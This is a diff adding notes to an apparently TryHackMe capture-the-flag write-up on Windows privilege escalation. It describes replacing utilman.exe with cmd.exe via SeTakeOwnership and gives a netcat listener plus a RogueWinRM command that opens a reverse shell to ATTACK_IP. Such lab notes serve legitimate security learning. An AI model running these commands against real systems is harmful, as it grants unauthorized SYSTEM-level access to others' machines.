@@ -206,5 +206,19 @@ nt authority\system
 C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
 THM{SEFLAGPRIVILEGE}
 
+# SE Take ownership:
 
+The second method is a doozy! I love it. It exploits the utilman.exe program which runs as System. We can take ownership and replace it with cmd.exe and then run it from the lock screen as an assistive technology.
 
+# SE Impersonate / Assign Primary Token
+
+for the last exploit on this page we impersonate another user through a webshell
+
+on attackbox start:
+nc -nvlp 4448
+
+in browser go to http://REMOTE_IP
+the exploit is already in the tools folder so run:
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACK_IP 4448"
+
+and you should get a reverse shell in your netcat listener.
